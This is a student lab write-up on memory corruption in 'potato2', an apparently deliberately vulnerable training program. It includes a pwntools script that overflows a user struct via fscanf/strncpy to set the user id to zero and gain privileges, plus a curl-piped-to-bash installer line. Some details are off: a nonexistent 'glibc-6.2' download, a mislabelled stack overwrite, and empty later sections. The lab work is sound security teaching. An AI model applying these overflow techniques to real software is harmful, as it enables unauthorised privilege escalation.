Student: Ernst Schwaiger
Date 2024-04-12

# Heap Corruption

The steps below were executed on a Kali 2024.03 system for x64 that runs in a VirtualBox hypervisor.

## Building potato2 for 32 bits

Packages to install upfront to get potato2 to compile for i386/32 bit, python virtual environment,
glibc with debugging symbols, and gdb enhanced features/gef:

```bash
sudo apt install gcc 
sudo apt install gcc-multilib
sudo apt install libc6-dbg-i386-cross
sudo apt install glibc-source
sudo apt install python3-virtualenv
bash -c "$(curl -fsSL https://gef.blah.cat/sh)"
```

Checkout the sources of `potato2` and `openssl`, the latter is required since we are going to
build potato2 as 32 bit binary, hence the `openssl` libraries need to be available as 32 bit
as well.

```sh
git clone https://github.com/edgecase1/potato2.git
git clone https://github.com/openssl/openssl.git
cd openssl
./Configure -m32 linux-generic32
make -sj
cd ..
make -sj
cp potato2/userlist .
```

The second make builds `potato2` as 32 bit executable. Since the built `potato2` binaries require to have
the `userlist` file present in the current folder, this file is copied from the `potato2` folder.

```Makefile
# needs to have openssl checked out as sibling folder of potato
# git clone https://github.com/openssl/openssl.git
# and requires installation of gcc multilib
# sudo apt install gcc-multilib for m32

WARN_OPTS=-Wno-deprecated-declarations -Wno-unused-result
SEC_OPTS=-fno-stack-protector -z execstack -no-pie
DEBUG_OPTS=-ggdb3 -O0
INCLUDES=-Iopenssl/include -I/usr/include -Ipotato2/src
DEFINES=-D_FORTIFY_SOURCE=0

CCOPTS = $(WARN_OPTS) $(SEC_OPTS) $(DEBUG_OPTS) $(INCLUDES) $(DEFINES)

CFILES = \
	potato2/src/main.c \
	potato2/src/runr.c \
	potato2/src/sock.c \
	potato2/src/userlist.c \
	potato2/src/func.c \
	potato2/src/login2.c

HFILES = \
	potato2/src/runr.h \
	potato2/src/sock.h \
	potato2/src/user.h \
	potato2/src/userlist.h 

.PHONY: clean all

all: potato

# binary for usual attacks
potato: $(CFILES) $(HFILES)
	gcc -m32 $(CCOPTS) -o potato $(CFILES) -Lopenssl  -lssl -lcrypto 

clean:
	rm -f potato
```

Now, potato2 can be built and run in the `potato` folder:

```bash
make -sj
./potato
./potato console
./potato server
```

On Kali systems, `LD_LIBRARY_PATH` is empty, hence an error message 
`error while loading shared libraries: libcrypto.so.3: cannot open shared object file` appears when
`./potato` is started. To get around that, add the folder where openssl was checked out to:

```bash
export LD_LIBRARY_PATH=<openssl_folder>:$LD_LIBRARY_PATH
```

## Setup of the debugging environment

Start a python virtual environment, install the `pwntools` and `libheap` packages.

```bash
virtualenv venv
. ./venv/bin/activate
pip install pwntools
git clone https://github.com/cloudburst/libheap
pip3 install ./libheap/
```

## overwrite a user (t_user) structure to gain privileges

It is possible to make the currently logged in user a privileged one overwriting the stack return address. 
By overwriting the global user data structure such that the logged in user obtains a user id of zero, we get the 
credentials. 


```c
int
is_privileged()
{
    t_user* user = session.logged_in_user;
     if(user->id < 1 || user->gid < 1) // is a root user
     {
          return 1;
     }
     else
     {
          fprintf(stderr, "privileged users only!");
          return 0;
     }
}
```

For that purpose, we exploit the fact that the `strncpy()` call in `change_name()` always 
appends the string terminator `0x00` to the target string:

```c
void
change_name()
{
    char input_username[USERNAME_LENGTH];
        
    fprintf(stdout, "What is the name > ");
    //fgets(input_username, sizeof(input_username), stdin);
    fscanf(stdin, "%s", input_username); // TODO security
    input_username[strcspn(input_username, "\n")] = 0x00; // terminator instead of a newline

    strncpy(session.logged_in_user->name, input_username, strlen(input_username)+1);
    fprintf(stdout, "Name changed.\n");
}
```

The `t_user` data structure into which `strncpy()` writes is defined as follows:
```c
struct _user
{
     char name[20];
     char password_hash[32]; // md5
     int id;
     int gid;
     char home[50];
     char shell[50];
} typedef t_user;
```

By providing a long enough input string, strncpy will overwrite `name`, `password_hash`, and `id` and insert
a `0x00` byte at the end. The value of `id` in the current users' `t_user` structure is `10000`, or `0x2710`. 
In a little-endian architecture, the LSB of `id` can be found at the address of `id`, and the MSB at the 
address of `id` + 3:

```gdb
gef➤  x/4bx &session->logged_in_user->id
0x8050464:      0x10    0x27    0x00    0x00
```

The number of bytes to overwrite until we arrive at the LSB of `id` is `0x34`, or `52`; it 
can be calculates as follows:

```gdb
gef➤  p &session->logged_in_user->id
$1 = (int *) 0x8050464
gef➤  p &session->logged_in_user->name
$2 = (char (*)[20]) 0x8050430
gef➤  p 0x8050464 - 0x8050430
$3 = 0x34
gef➤  
```

By providing a string of length `52 + 1`, `strncpy` will overwrite the `0x27` byte of the `id` field with `0x00`,
by providing a string of length `52`, `strncpy` will overwrite the `0x10` byte.

```python
#!/usr/bin/env python3

from pwn import *

import sys

elf = ELF("./potato")

p = elf.process(["console"], stdin=PTY, aslr=False) # stdin=PTY for "getpass" password input
gdb.attach(p, '''
break main
break func.c:191
continue
''')

print(p.recvuntil(b"cmd> ")) # username
p.sendline(b"login")
# test user
p.sendline(b"peter")
p.sendline(b"12345")
print(p.recvuntil(b"cmd> ")) # username

# overwrite user structure with user-chosen id: 0
# This overwrites the bytes of the global user-id via the strncpy() call in func.c, 190
# since strncpy adds a null terminator at session.logged_in_user->name[54]
p.sendline(b"changename")
payload=b"\x41"*50 + b"\x42"*3
p.sendline(payload)

# Repeat the same for session.logged_in_user->name[53]
p.sendline(b"changename")
payload=b"\x41"*50 + b"\x42"*2
p.sendline(payload)

# all bytes in session.logged_in_user->id are now zero, we are privileged
# change name back to original
p.sendline(b"changename")
payload=b"peter"
p.sendline(payload)

p.interactive()
```

After returning to interactive mode, `whoami` displays the `id`of the current user as zero, i.e. privileged.

```bash
cmd> $ whoami
user(name='peter' id=0 gid=10000 home='/home/peter' shell='/usr/bin/rbash')
```

## find a memory leak to identify a heap bin or chunk (look at the session and whoami; it's enough to show the chunk or memory location in gdb) [3]

The function `str2md5()` allocates a buffer of 90 bytes which it returns to the calling function. The calling function then has to dispose of
that buffer after usage. In `change_password()` and in `check_password()`, however, the allocated memory is not given back. A memory leak
is caused by an attempt to login, no matter whether it was successful or not.


```bash
wget http://ftp.gnu.org/gnu/libc/glibc-6.2.tar.gz  
tar -xf glibc-6.2.tar.gz  
sudo apt install bison
export LD_LIBRARY_PATH=""
../configure --prefix=/home/kali/projects/CyberSecurity/HeapCorruption/glibc --host=i686-linux-gnu CFLAGS="-m32" CPPFLAGS="-m32" --enable-debug
../configure --prefix=/home/kali/projects/CyberSecurity/HeapCorruption/glibc CFLAGS="-Og -g -Wno-maybe-uninitialized" CPPFLAGS="-Og -g -Wno-maybe-uninitialized" --enable-debug
```

## gain a shell with root privileges (look at the allocator with ltrace while creating and deleting users) [4]

Download a glibc version, e.g. 2.41 `https://ftp.gnu.org/gnu/glibc/glibc-2.41.tar.gz`, configure it
for 32 bit compilation with debugging info, then compile and install it, e.g. to `$HOME/projects/CyberSecurity/HeapCorruption/glibc`:

```bash
cd glibc-2.41
mkdir build
cd build
../configure --prefix=$HOME/projects/CyberSecurity/HeapCorruption/glibc \
     --host=i686-linux-gnu \
     --build=i686-linux-gnu \
     CC="gcc -m32" CXX="g++ -m32" \
     CFLAGS="-O2 -g -march=i686" \
     CXXFLAGS="-O2 -g -march=i686"
make -sj
make install


for X86-64:
../configure --prefix=$HOME/projects/CyberSecurity/HeapCorruption/glibc64 \
     CFLAGS="-O2 -g" \
     CXXFLAGS="-O2 -g"


```

The target binary can now be linked against the built library using, e.g.:

```Makefile
CCOPTS=-ggdb3 -O0 -m32
GLIBC_FOLDER=/home/kali/projects/CyberSecurity/HeapCorruption/glibc
GLIBC_LIB=/home/kali/projects/CyberSecurity/HeapCorruption/glibc-2.41/build
GLIBC_INC=/home/kali/projects/CyberSecurity/HeapCorruption/glibc/include 

all: demo

demo: demo.c
	gcc $(CCOPTS) -I$(GLIBC_INC) -o demo demo.c -L$(GLIBC_LIB) -Wl,-rpath,$(GLIBC_LIB) -lc

clean:
	rm -f demo
```

Ensure the binary actually will load the built shared object file in RUNPATH:

```bash
readelf -d demo
Dynamic section at offset 0x2ee4 contains 27 entries:
  Tag        Type                         Name/Value
 0x00000001 (NEEDED)                     Shared library: [libc.so.6]
 0x0000001d (RUNPATH)                    Library runpath: [/home/kali/projects/CyberSecurity/HeapCorruption/glibc-2.41/build]
 0x0000000c (INIT)                       0x1000
 0x0000000d (FINI)                       0x1564
 0x00000019 (INIT_ARRAY)                 0x3edc
 0x0000001b (INIT_ARRAYSZ)               4 (bytes)
 0x0000001a (FINI_ARRAY)                 0x3ee0
 0x0000001c (FINI_ARRAYSZ)               4 (bytes)
 0x6ffffef5 (GNU_HASH)                   0x1ec
 0x00000005 (STRTAB)                     0x2ec
 0x00000006 (SYMTAB)                     0x20c
 0x0000000a (STRSZ)                      279 (bytes)
 0x0000000b (SYMENT)                     16 (bytes)
 0x00000015 (DEBUG)                      0x0
 0x00000003 (PLTGOT)                     0x3ff4
 0x00000002 (PLTRELSZ)                   56 (bytes)
 0x00000014 (PLTREL)                     REL
 0x00000017 (JMPREL)                     0x4a8
 0x00000011 (REL)                        0x460
 0x00000012 (RELSZ)                      72 (bytes)
 0x00000013 (RELENT)                     8 (bytes)
 0x6ffffffb (FLAGS_1)                    Flags: PIE
 0x6ffffffe (VERNEED)                    0x420
 0x6fffffff (VERNEEDNUM)                 1
 0x6ffffff0 (VERSYM)                     0x404
 0x6ffffffa (RELCOUNT)                   4
 0x00000000 (NULL)                       0x0
```


https://unix.stackexchange.com/questions/565593/compiling-gcc-against-a-custom-built-glibc


## demonstrate a use after free or double free condition in the program [3]

